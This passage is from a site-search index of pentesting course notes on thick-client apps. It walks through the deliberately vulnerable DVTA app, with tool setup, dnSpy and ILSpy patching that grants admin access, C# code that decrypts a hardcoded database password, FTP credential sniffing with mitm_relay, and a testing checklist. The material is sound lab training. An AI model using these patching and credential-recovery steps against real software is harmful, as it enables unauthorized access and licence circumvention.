pentesting","labs"]},{"location":"thick-applications/tca-common-vulnerabilities/","title":"Common vulnerabilities","text":"<p>General index of the course</p> <ul> <li>Introduction.</li> <li>Tools for pentesting thick client applications.</li> <li>Basic lab setup.</li> <li>First challenge: enabling a button.</li> <li>Information gathering phase.</li> <li>Traffic analysis.</li> <li>Attacking thick clients applications.</li> <li>Reversing and patching thick clients applications.    </li> <li>Common vulnerabilities.</li> </ul>","tags":["thick client applications","thick client applications pentesting","binscope","visual code grepper"]},{"location":"thick-applications/tca-common-vulnerabilities/#application-signing","title":"Application Signing","text":"<p>For checking if the application is signed, we use the tool sigcheck, from SysInternals Suite.</p> <p>From command line we run sigcheck.exe and check if DVTA.exe is signed.</p> <p></p>","tags":["thick client applications","thick client applications pentesting","binscope","visual code grepper"]},{"location":"thick-applications/tca-common-vulnerabilities/#compiler-protection","title":"Compiler protection","text":"<p>We will use the tool binscope, provided by Microsoft. </p> <p>Download it from: https://www.microsoft.com/en-us/download/details.aspx?id=44995</p> <p>Install it by double-clicking on it.</p> <p>Now from command line:</p> <pre><code>.\\binscope.exe /verbose /html /logfile c:/path/to/outputreport.html C:/path/to/application/toAudit/DVTA.exe\n</code></pre> <p>After executing the command you will obtain a report of some basic checks that binscope run on the application.</p>","tags":["thick client applications","thick client applications pentesting","binscope","visual code grepper"]},{"location":"thick-applications/tca-common-vulnerabilities/#automated-source-code-scanning","title":"Automated source code scanning","text":"","tags":["thick client applications","thick client applications pentesting","binscope","visual code grepper"]},{"location":"thick-applications/tca-common-vulnerabilities/#visual-code-grepper","title":"Visual Code Grepper","text":"<p>Download it from: https://sourceforge.net/projects/visualcodegrepp/</p> <p>To run a scan:</p> <p>1. Open the application in dotpeek and export it as a visual Studio project. This will export the decompiled code of the application where we indicate. </p> <p>2. Open Visual Code Grepper. In menu FILE, first option, specify the target directory (where we saved the decompiled files). If error message says that \"no files for the specified language\", change language in menu Settings (C#).</p> <p>3. Click on menu Scan&gt; Full scan.</p>","tags":["thick client applications","thick client applications pentesting","binscope","visual code grepper"]},{"location":"thick-applications/tca-first-challenge/","title":"First challenge: enabling a button","text":"<p>General index of the course</p> <ul> <li>Introduction.</li> <li>Tools for pentesting thick client applications.</li> <li>Basic lab setup.</li> <li>First challenge: enabling a button.</li> <li>Information gathering phase.</li> <li>Traffic analysis.</li> <li>Attacking thick clients applications.</li> <li>Reversing and patching thick clients applications.    </li> <li>Common vulnerabilities.</li> </ul> <p>One thing is still missing after the Basic lab setup: launching the application and making sure that it works. If we proceed, sooner than later we will see that one thing is left to be done before starting to use DVTA app: Setting up the server in the vulnerable app (DVTA).</p>","tags":["thick client applications","thick client applications pentesting","dnspy"]},{"location":"thick-applications/tca-first-challenge/#the-problem-a-button-is-not-working","title":"The problem: a button is not working","text":"<p>If we launch the vulnerable app, DVTA, we will check that the button labelled as \"Configure Server\" is not enable. We will use the tool  dnspy  to enable that button.</p> <p></p>","tags":["thick client applications","thick client applications pentesting","dnspy"]},{"location":"thick-applications/tca-first-challenge/#using-dnspy-to-see-and-modify-compiled-code","title":"Using dnspy to see and modify compiled code","text":"<p>1. We will use dnspy 32 bit version, since dvta is a 32 bit app. Open the version 32 bit of dnspy, and go to FILE  &gt; Open &gt; [Select de DVTA.exe file] and you will see it in the sidebar of dnspy:</p> <p></p> <p>2. Expand DVTA, go to the decompiled object that is being used in the login and read the code. You will see the function isserverConfigured(). Also in the opening tooltip you can read that this function is receiving a BOOLEAN value. </p> <p></p> <p>3. Edit the function in IL instructions</p> <p></p> <p>4.  Modify the value of the boolean in the IL instruction.</p> <p></p> <p>5. Save the module.</p> <p></p> <p>6. Now when you open the DVTA application the button will be enabled and we will be able to setup the server. Our server is going to be that one of the database that we just configure for our application (127.0.0.1).</p> <p></p> <p></p>","tags":["thick client applications","thick client applications pentesting","dnspy"]},{"location":"thick-applications/tca-first-challenge/#making-sure-that-it-works","title":"Making sure that it works","text":"<p>If we browse the configuration file (DVTA.exe.Config) we will see that the configuration has taken place:</p> <p></p>","tags":["thick client applications","thick client applications pentesting","dnspy"]},{"location":"thick-applications/tca-information-gathering-phase/","title":"Information gathering phase - Thick client Applications","text":"<p>General index of the course</p> <ul> <li>Introduction.</li> <li>Tools for pentesting thick client applications.</li> <li>Basic lab setup.</li> <li>First challenge: enabling a button.</li> <li>Information gathering phase.</li> <li>Traffic analysis.</li> <li>Attacking thick clients applications.</li> <li>Reversing and patching thick clients applications.    </li> <li>Common vulnerabilities.</li> </ul>","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#what-we-will-be-doing","title":"What we will be doing","text":"<p>1. Understand the functionality of the application.</p> <p>2. Architecture diagram from the client.</p> <p>3. Network communications in the app.</p> <p>4. Files that are being accessed by the client.</p> <p>5. Interesting files within the application directory.</p> <p>Tools:  CFF explorer, wireshark, and sysInternalsSuite.</p>","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#ip-addresses-that-the-app-is-communicating-with","title":"IP addresses that the app is communicating with","text":"","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#tcp-view","title":"TCP View","text":"<p>To see which IP addresses is the app communicating with, we can use TCP View from sysInternalsSuite.</p> <p></p>","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#wireshark","title":"Wireshark","text":"<p>We can also use wireshark</p> <p></p>","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#language-in-which-the-app-is-built-in","title":"Language in which the app is built in","text":"","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#cff-explorer","title":"CFF Explorer","text":"<p>To see which  language is the app build in, and which tool was used, we can use  CFF explorer. Open the app with CFF  Explorer.</p> <p></p>","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#changes-in-the-filesystem","title":"Changes in the FileSystem","text":"","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#procesmonitor","title":"ProcesMonitor","text":"<p>Use ProcessMonitor tool from sysInternalsSuite to see changes in the file system.</p> <p>For instance, you can analyze the access to interesting files in the application directory. Now we have this information:</p> <p></p> <pre><code>&lt;add key=\"DBSERVER\" value=\"127.0.0.1\\SQLEXPRESS\" /&gt;\n&lt;add key=\"DBNAME\" value=\"DVTA\" /&gt;\n&lt;add key=\"DBUSERNAME\" value=\"sa\" /&gt;\n&lt;add key=\"DBPASSWORD\" value=\"CTsvjZ0jQghXYWbSRcPxpQ==\" /&gt;\n&lt;add key=\"AESKEY\" value=\"J8gLXc454o5tW2HEF7HahcXPufj9v8k8\" /&gt;\n&lt;add key=\"IV\" value=\"fq20T0gMnXa6g0l4\" /&gt;\n&lt;add key=\"ClientSettingsProvider.ServiceUri\" value=\"\" /&gt;\n&lt;add key=\"FTPSERVER\" value=\"127.0.0.1\" /&gt;\n</code></pre>","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#locate-credentials-and-information-in-registry-entries","title":"Locate credentials and information in Registry entries","text":"","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#processmonitor","title":"ProcessMonitor","text":"<p>Using ProccessMonitor from sysInternalsSuite to locate credentials and information stored in the key registers. And for that, after cleaning all the processes in ProcMon (ProcessMonitor app), you close the application and reopen it. </p> <p>If the session is still there, it means that the session is saved somewhere. In this case the session is saved in the registry keys.</p> <p></p> <p>Interesting thing here is the Registry Key \"isLoggedIn\". We could try to modify the boolean value of that registry to bypass login.</p> <p>Also, check these other tools and resources:</p> <ul> <li>WinSpy.</li> <li>Window Detective</li> <li>netspi.com.</li> </ul>","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-information-gathering-phase/#enumerate-libraries-and-resources-employed-in-building-the-app","title":"Enumerate libraries and resources employed in building the app","text":"<p>When pentesting a thick-client application, I came across this nice way to enumerate libraries, dependencies, sources...  By using  Sigcheck from sysInternalsSuite, you can view metadata from the images with executables. Additionally, you can save the results to a CSV for reporting purposes.</p> <pre><code>.\\sigcheck.exe -nobanner -s -e &lt;folder/binaryFile&gt;\n# -s: Search recursively, useful for thick client apps with lot of folders and subfolders\n# -e: Scan executable images only (regardless of their extension)\n# -nobanner:    Do not display the startup banner and copyright message.\n</code></pre> <p>One cool flag is the recursive one (\"-s\"), which helps you avoid navigating through the folder structure. </p>","tags":["thick client applications","thick client applications pentesting","tcp view","wireshark","procesMonitor"]},{"location":"thick-applications/tca-reversing-and-patching/","title":"Reversing and patching thick clients applications","text":"<p>General index of the course</p> <ul> <li>Introduction.</li> <li>Tools for pentesting thick client applications.</li> <li>Basic lab setup.</li> <li>First challenge: enabling a button.</li> <li>Information gathering phase.</li> <li>Traffic analysis.</li> <li>Attacking thick clients applications.</li> <li>Reversing and patching thick clients applications.    </li> <li>Common vulnerabilities.</li> </ul>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#reversing-net-applications","title":"Reversing .NET applications","text":"","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#required-software","title":"Required software","text":"<ul> <li>dnspy: c# code + IL code + patching the application</li> <li>dotPeek (from JetBrains)</li> <li>ILspy / Reflexil</li> <li>ILASM (IL Assembler) (comes with .NET Framework).</li> <li>ILDASM (IL Disassembler) (comes with Visual Studio).</li> </ul> <p>IL stands for Intermediate Language.</p>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#installing-visual-studio-community-2019-version-1611","title":"Installing Visual Studio Community 2019 (version 16.11)","text":"<p>Download from: https://my.visualstudio.com/Downloads?q=Visual%20Studio%202019</p> <p></p>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#installing-dotpeek","title":"Installing dotPeek","text":"<p>dotPeek Cheatsheet  Download from: https://www.jetbrains.com/es-es/decompiler/download/#section=web-installer</p> <p></p>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#decompiling-with-dotpeek-executing-with-visual-studio","title":"decompiling with dotPeek + executing with Visual Studio","text":"<p>We will try to decompile the app using dotPeek to decrypt the database connection. Remember from the config file </p> <pre><code>      &lt;add key=\"DBPASSWORD\" value=\"CTsvjZ0jQghXYWbSRcPxpQ==\" /&gt;\n      &lt;add key=\"AESKEY\" value=\"J8gLXc454o5tW2HEF7HahcXPufj9v8k8\" /&gt;\n      &lt;add key=\"IV\" value=\"fq20T0gMnXa6g0l4\" /&gt;\n</code></pre> <p>(The config file was  DVTA.exe.Config, located in the same directory as the app).</p> <p>We will use dotpeek + Visual Studio to understand the logic under that connection.</p> <p>Open the app DVTA from dotpeek, go to DVTA&gt;References&gt;DBAccess and double click it. Then you will get a Resource uploaded with the name &gt; DBAccess Class. In it there is a function called decryptPassword() </p> <pre><code>public string decryptPassword()\n    {\n      string s1 = ConfigurationManager.AppSettings[\"DBPASSWORD\"].ToString();\n      string s2 = ConfigurationManager.AppSettings[\"AESKEY\"].ToString();\n      string s3 = ConfigurationManager.AppSettings[\"IV\"].ToString();\n      byte[] inputBuffer = Convert.FromBase64String(s1);\n      AesCryptoServiceProvider cryptoServiceProvider = new AesCryptoServiceProvider();\n      cryptoServiceProvider.BlockSize = 128;\n      cryptoServiceProvider.KeySize = 256;\n      cryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s2);\n      cryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s3);\n      cryptoServiceProvider.Padding = PaddingMode.PKCS7;\n      cryptoServiceProvider.Mode = CipherMode.CBC;\n      this.decryptedDBPassword = Encoding.ASCII.GetString(cryptoServiceProvider.CreateDecryptor(cryptoServiceProvider.Key, cryptoServiceProvider.IV).TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));\n      Console.WriteLine(this.decryptedDBPassword);\n      return this.decryptedDBPassword;\n</code></pre> <p></p> <p>So we will open Visual Studio and we will create a New Project, a Windows Form  Application (.NET Framework). We will call the project PasswordDecryptor.  Create a button. Name it Decrypt.</p> <p></p> <p>By double-clicking on the Decrypt button we will be taken to the Source code of that button.</p> <p>This is what we are going to put in that button:</p> <pre><code>using System;\nusing System.Collections.Generic;\nusing System.ComponentModel;\nusing System.Data;\nusing System.Drawing;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\nusing System.Windows.Forms;\nusing System.Security.Cryptography;\n\nnamespace decryptorpassword\n{\n    public partial class Decrypt : Form\n    {\n        public Decrypt()\n        {\n            InitializeComponent();\n        }\n\n        private void button1_Click(object sender, EventArgs e)\n        {\n            string dbpassword = \"CTsvjZ0jQghXYWbSRcPxpQ==\";\n            string  aeskey = \"J8gLXc454o5tW2HEF7HahcXPufj9v8k8\";\n            string iv = \"fq20T0gMnXa6g0l4\";\n            byte[] inputBuffer = Convert.FromBase64String(dbpassword);\n            AesCryptoServiceProvider cryptoServiceProvider = new AesCryptoServiceProvider();\n            cryptoServiceProvider.BlockSize = 128;\n            cryptoServiceProvider.KeySize = 256;\n            cryptoServiceProvider.Key = Encoding.ASCII.GetBytes(aeskey);\n            cryptoServiceProvider.IV = Encoding.ASCII.GetBytes(iv);\n            cryptoServiceProvider.Padding = PaddingMode.PKCS7;\n            cryptoServiceProvider.Mode = CipherMode.CBC;\n            string decryptedDBPassword = Encoding.ASCII.GetString(cryptoServiceProvider.CreateDecryptor(cryptoServiceProvider.Key, cryptoServiceProvider.IV).TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));\n            Console.WriteLine(decryptedDBPassword);\n        }\n    }\n}\n</code></pre> <p>Some things not said in the video: it's quite possible you will need to debug this simple application. For that, the best thing to do is reading error messages and try to fix them. In my case,  a basic library for the execution of this code was missing:</p> <pre><code>using System.Security.Cryptography;\n</code></pre> <p>Also, it was needed to rename the .exe output file in the Main() function like this</p> <pre><code># what it said\n  Application.Run(new Form1());\n# what it needed to say to match to my code\n  Application.Run(new Decrypt());\n</code></pre>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#decompiling-and-executing-with-dnspy","title":"Decompiling and executing with dnspy","text":"<p>1. Open the application in dnspy. Go to Login. Click on namespace DBAccess</p> <p></p> <p>2. Click on DBAccessClass</p> <p></p> <p>3. Locate the function decryptPassword(). That's the one we would love to run. For that locate where it is called from. Add a Breakpoint there. Run the code. You will be asked about which executable to run (select DVTA.exe). After that, the code will be executed up to the breakpoint. Enter credentials and see in the Notification area how variables are being called.</p> <p></p> <p>Eventually, you will see the decrypted connection string in those variables. You can add more breakpoints.</p> <p></p>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#using-ilspy-reflexil-to-patch-applications","title":"Using ILSpy + Reflexil to patch applications","text":"","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#ilspy-setup","title":"ILSpy Setup","text":"<p>Repository: https://github.com/icsharpcode/ILSpy/releases</p> <p>Requirements: .NET 6.0. Download zip to tools. Place the file ILSpy_binaries_8.0.0.7246-preview3.zip into the tool folder and extract files. </p>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#setup-reflexil-plugin-in-ilspy","title":"Setup Reflexil plugin in ILSpy","text":"<p>1. Download from: https://github.com/sailro/Reflexil/releases</p> <p>2. Place the file reflexil.for.ILSpy.2.7.bin into tools and extract files. </p> <p>3. Enter the Reflexil folder and copy the .dll file Reflexil.ILSpy.Plugin.dll. </p> <p>4. Place it into ILSpy directory. Now the plugin is installed.</p>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#patching-with-ilspy-reflexil","title":"Patching with ILSpy + Reflexil","text":"<p>One interesting thing about ILSpy (different from other tools) is that you can see code in 3 modes: IL, C# and the combined mode, C# + IL. This last mode comes in hand to be able to interpretate much better what the code is about.</p> <p>1. Open DVTA app from ILSpy and locate this code:</p> <p></p> <p>Access to the admin pannel is decided with an IF statement and a integer variable set to 0/1. We will modify this value using ILSpy + Reflexil and patch again the application.</p> <p>2. Open Reflexil plugin:</p> <p></p> <p>3. In the Reflexil pannel, look for the specific instruction (the one that moves to the pile the value 1) and change the value to 0. </p> <p></p> <p>4. Save the changes in your DVTA application with a different name:</p> <p></p> <p>5. When opening the new saved application, you will access admin pannel even if you login with normal user credentials.</p> <p></p>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#using-ilasm-and-ldasm-to-patch-applications","title":"Using ilasm and ldasm to patch applications","text":"<p>ilasm (IL assembler) and ldasm (il disasembler) are tools provided by Microsoft in Visual Studio.</p> <p>We will use ILDASM to disasembler the DVTA application</p> <pre><code>C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\ildasm.exe\n</code></pre> <p>And ILASM to assemble again the application:</p> <pre><code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ilasm.exe\n</code></pre> <p>1. Open DVTA.exe with ILDASM.exe from command line:</p> <p></p> <p>2. Dump the folder. FILES&gt; Dump</p> <p></p> <p>3. Save that dumped code (which will be IL) into a folder. Close the ILDASM application. The folder generated contains the IL code. There is an specific file called DVTA.il</p> <p>4. Open DVTA.il in a text editor and modify the instruction you want to modify. In our case we will change \"ldc.i4.1\" to \"ldc.i4.0\".</p> <p></p> <p>5. From command line, we will use ILASM to assemble that DVTA.il file into a new application</p> <pre><code>cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\\n.\\ilasm.exe C:\\User\\lala\\Desktop\\RE\\DVTA.il\n</code></pre>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-reversing-and-patching/#anti-piracy-measures-implemented-by-some-apps","title":"Anti piracy measures implemented by some apps","text":"<p>Mechanism to track or prevent illegitimate copying or usage of the software:</p> <ul> <li>Does the app use serial keys, or License Keys to ensure that only allowed number of users can load and operate the software?</li> <li>Does the application stop operating after the expiration of license or serial key?</li> <li></li> <li>\u2022 Tracking back the legitimate and illegitimate usage of the application</li> </ul>","tags":["thick client applications","thick client applications pentesting","dnspy","dotpeek","ilspy","reflexil","ilasm","idasm"]},{"location":"thick-applications/tca-traffic-analysis/","title":"Traffic analysis - Thick client Applications","text":"<p>General index of the course</p> <ul> <li>Introduction.</li> <li>Tools for pentesting thick client applications.</li> <li>Basic lab setup.</li> <li>First challenge: enabling a button.</li> <li>Information gathering phase.</li> <li>Traffic analysis.</li> <li>Attacking thick clients applications.</li> <li>Reversing and patching thick clients applications.    </li> <li>Common vulnerabilities.</li> </ul>","tags":["thick client applications","thick client applications pentesting","burpsuite","echo mirage","mitm relay","wireshark"]},{"location":"thick-applications/tca-traffic-analysis/#tools-needed","title":"Tools needed","text":"<ul> <li>BurpSuite</li> <li>Echo mirage, very old and not maintained.</li> <li>mitm_relay </li> <li>Wireshark</li> </ul> <p>Difficult part here is when the thick app is not using http/https protocol. In that case, BurpSuite alone is out of consideration and we will need to use:</p> <ul> <li>wireshark, it's ok if we just want to monitor. </li> <li>Echo mirage, very old and not maintained.</li> <li>mitm_relay + BurpSuite.</li> </ul>","tags":["thick client applications","thick client applications pentesting","burpsuite","echo mirage","mitm relay","wireshark"]},{"location":"thick-applications/tca-traffic-analysis/#traffic-monitoring-with-wireshark","title":"Traffic monitoring with Wireshark","text":"<p>1. We make sure  that port 21 is listening in the Filezilla Server.</p> <p></p> <p>And we start the capture with Wireshark. We will open DVTA with admin credentials and we will click on \"Back up Data to the FTP Server\". If we filter the capture in wireshark leaving only FTP traffic we will be able to retrieve user and password in plain text:</p> <p></p>","tags":["thick client applications","thick client applications pentesting","burpsuite","echo mirage","mitm relay","wireshark"]},{"location":"thick-applications/tca-traffic-analysis/#traffic-monitoring-with-echo-mirage","title":"Traffic monitoring with Echo mirage","text":"<p>1. Open Echo Mirage and add a rule to intercept all inbound and outbound traffic in port 21.</p> <p>2.  In TAB \"Process\" &gt; Inject, and select the application.</p> <p></p> <p>3. In the vulnerable app DVTA login as admin and click on action \"Backup Data to FTP Server\". Now in Echo Mirage you will be intercepting the traffic. This way we can capture USER and PASSWORD:</p> <p></p> <p>Also, modifying the payload you will be tampering the request.</p>","tags":["thick client applications","thick client applications pentesting","burpsuite","echo mirage","mitm relay","wireshark"]},{"location":"thick-applications/tca-traffic-analysis/#traffic-monitoring-with-mitm_relay-burpsuite","title":"Traffic monitoring with mitm_relay + Burpsuite","text":"<p>In DVTA we will configure the server to the IP of the local machine. In my lab setup, my IP was 10.0.2.15.</p> <p>In FTP, we will configure the listening port to 2111. Also, we will disable IP check for this lab setup to work.</p> <p>From https://github.com/jrmdev/mitm_relay:</p> <p></p> <p>This is what we're doing:</p> <p></p> <p>1. DVTA application sends traffic to port 21, so to intercept it we configure MITM_relay to be listening on port 21.</p> <p>2. mitm_relay encapsulates the application traffic (no matter the protocol) into HTTP protocol so BurpSuite can read it.</p> <p>3. Burp Suite will read the traffic. And we can tamper here our code.</p> <p>4. mitm_relay will \"unfunnel\" the traffic from the HTPP protocol into the raw one.</p> <p>5. In a lab setup FTP server will be in the same network, so to not get in conflict with mitm_relay we will modify FTP listen port to 2111. In real life this change is not necessary</p> <p>Running mitm_relay:</p> <pre><code>python mitm_relay.py -l 0.0.0.0 -r tcp:21:10.0.2.15:2111 -p 127.0.0.1:8080\n# -l listening address for mitm_relay (0.0.0.0 means we all listening in all interfaces)\n# -r relay configuration: &lt;protocol&gt;:&lt;listeningPort&gt;:&lt;IPofDestinationserver&gt;:&lt;listeningPortonDestinationServer&gt;\n# -p Proxy configuration: &lt;IPofProxy&gt;:&lt;portOfProxy&gt; \n</code></pre> <p></p> <p>And this is how the interception looks like:</p> <p></p>","tags":["thick client applications","thick client applications pentesting","burpsuite","echo mirage","mitm relay","wireshark"]},{"location":"thick-applications/thick-application-checklist/","title":"Thick client Applications Pentesting Checklist","text":"<p>Source</p>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/thick-application-checklist/#information-gathering","title":"Information gathering","text":"<pre><code>**Information Gathering**\n\n- [ ]  Find out the application architecture (two-tier or three-tier)\n- [ ]  Find out the technologies used (languages and frameworks)\n- [ ]  Identify network communication\n- [ ]  Observe the application process\n- [ ]  Observe each functionality and behavior of the application\n- [ ]  Identify all the entry points\n- [ ]  Analyze the security mechanism (authorization and authentication)\n\n**Tools Used**\n\n- [ ]  CFF Explorer\n- [ ]  Sysinternals Suite\n- [ ]  Wireshark\n- [ ]  PEid\n- [ ]  Detect It Easy (DIE)\n- [ ]  Strings\n</code></pre>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/thick-application-checklist/#gui-testing","title":"GUI testing","text":"<pre><code>**Test For GUI Object Permission**\n\n- [ ]  Display hidden form object\n- [ ]  Try to activate disabled functionalities\n- [ ]  Try to uncover the masked password\n\n**Test GUI Content**\n\n- [ ]  Look for sensitive information\n\n**Test For GUI Logic**\n\n- [ ]  Try for access control and injection-based vulnerabilities\n- [ ]  Bypass controls by utilizing intended GUI functionality\n- [ ]  Check improper error handling\n- [ ]  Check weak input sanitization\n- [ ]  Try privilege escalation (unlocking admin features to normal users)\n- [ ]  Try payment manipulation\n\n**Tools Used**\n\n- [ ]  UISpy\n- [ ]  Winspy++\n- [ ]  Window Detective\n- [ ]  Snoop WPF\n</code></pre>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/thick-application-checklist/#file-testing","title":"File testing","text":"<pre><code>**Test For Files Permission**\n\n- [ ]  Check permission for each and every file and folder\n\n**Test For File Continuity**\n\n- [ ]  Check strong naming\n- [ ]  Authenticate code signing\n\n**Test For File Content Debugging**\n\n- [ ]  Look for sensitive information on the file system (symbols, sensitive data, passwords, configurations)\n- [ ]  Look for sensitive information on the config file\n- [ ]  Look for Hardcoded encryption data\n- [ ]  Look for Clear text storage of sensitive data\n- [ ]  Look for side-channel data leakage\n- [ ]  Look for unreliable log\n\n**Test For File And Content Manipulation**\n\n- [ ]  Try framework backdooring\n- [ ]  Try DLL preloading\n- [ ]  Perform Race condition check\n- [ ]  Test for Files and content replacement\n- [ ]  Test for Client-side protection bypass using reverse engineering\n\n**Test For Function Exported**\n\n- [ ]  Try to find the exported functions\n- [ ]  Try to use the exported functions without authentication\n\n**Test For Public Methods**\n\n- [ ]  Make a wrapper to gain access to public methods without authentication\n\n**Test For Decompile And Application Rebuild**\n\n- [ ]  Try to recover the original source code, passwords, keys\n- [ ]  Try to decompile the application\n- [ ]  Try to rebuild the application\n- [ ]  Try to patch the application\n\n**Test For Decryption And DE obfuscation**\n\n- [ ]  Try to recover original source code\n- [ ]  Try to retrieve passwords and keys\n- [ ]  Test for lack of obfuscation\n\n**Test For Disassemble and Reassemble**\n\n- [ ]  Try to build a patched assembly\n\n**Tools Used**\n\n- [ ]  Strings\n- [ ]  dnSpy\n- [ ]  Procmon\n- [ ]  Process Explorer\n- [ ]  Process Hacker\n</code></pre>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/thick-application-checklist/#registry-testing","title":"REGISTRY TESTING","text":"<pre><code>**Test For Registry Permissions**\n\n- [ ]  Check read access to the registry keys\n- [ ]  Check to write access to the registry keys\n\n**Test For Registry Contents**\n\n- [ ]  Inspect the registry contents\n- [ ]  Check for sensitive info stored on the registry\n- [ ]  Compare the registry before and after executing the application\n\n**Test For Registry Manipulation**\n\n- [ ]  Try for registry manipulation\n- [ ]  Try to bypass authentication by registry manipulation\n- [ ]  Try to bypass authorization by registry manipulation\n\n**Tools Used**\n\n- [ ]  Regshot\n- [ ]  Procmon\n- [ ]  Accessenum\n</code></pre>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/thick-application-checklist/#network-testing","title":"NETWORK TESTING","text":"<pre><code>**Test For Network**\n\n- [ ]  Check for sensitive data in transit\n- [ ]  Try to bypass firewall rules\n- [ ]  Try to manipulate network traffic\n\n**Tools Used**\n\n- [ ]  Wireshark\n- [ ]  TCPview\n</code></pre>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/thick-application-checklist/#assembly-testing","title":"ASSEMBLY TESTING","text":"<pre><code>**Test For Assembly**\n\n- [ ]  Verify Address Space Layout Randomization (ASLR)\n- [ ]  Verify SafeSEH\n- [ ]  Verify Data Execution Prevention (DEP)\n- [ ]  Verify strong naming\n- [ ]  Verify ControlFlowGuard\n- [ ]  Verify HighentropyVA\n\n**Tools Used**\n\n- [ ]  PESecurity\n</code></pre>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/thick-application-checklist/#memory-testing","title":"MEMORY TESTING","text":"<pre><code>**Test For Memory Content**\n\n- [ ]  Check for sensitive data stored in memory\n\n**Test For Memory Manipulation**\n\n- [ ]  Try for memory manipulation\n- [ ]  Try to bypass authentication by memory manipulation\n- [ ]  Try to bypass authorization by memory manipulation\n\n**Test For Run Time Manipulation**\n\n- [ ]  Try to analyze the dump file\n- [ ]  Check for process replacement\n- [ ]  Check for modifying assembly in the memory\n- [ ]  Try to debug the application\n- [ ]  Try to identify dangerous functions\n- [ ]  Use breakpoints to test each and every functionality\n\n**Tools Used**\n\n- [ ]  Process Hacker\n- [ ]  HxD\n- [ ]  Strings\n</code></pre>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/thick-application-checklist/#traffic-testing","title":"TRAFFIC TESTING","text":"<pre><code>**Test For Traffic**\n\n- [ ]  Analyze the flow of network traffic\n- [ ]  Try to find sensitive data in transit\n\n**Tools Used**\n\n- [ ]  Echo Mirage\n- [ ]  MITM Relay\n- [ ]  Burp Suite\n</code></pre>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/thick-application-checklist/#common-vulnerabilities-testing","title":"COMMON VULNERABILITIES TESTING","text":"<pre><code>**Test For Common Vulnerabilities**\n\n- [ ]  Try to decompile the application\n- [ ]  Try for reverse engineering\n- [ ]  Try to test with OWASP WEB Top 10\n- [ ]  Try to test with OWASP API Top 10\n- [ ]  Test for DLL Hijacking\n- [ ]  Test for signature checks (Use Sigcheck)\n- [ ]  Test for binary analysis (Use Binscope)\n- [ ]  Test for business logic errors\n- [ ]  Test for TCP/UDP attacks\n- [ ]  Test with automated scanning tools (Use Visual Code Grepper - VCG)\n</code></pre>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/thick-application-checklist/#shaped-by-hariprasaanth-r","title":"Shaped by: Hariprasaanth R","text":"<p>Reach Me: LinkedIn 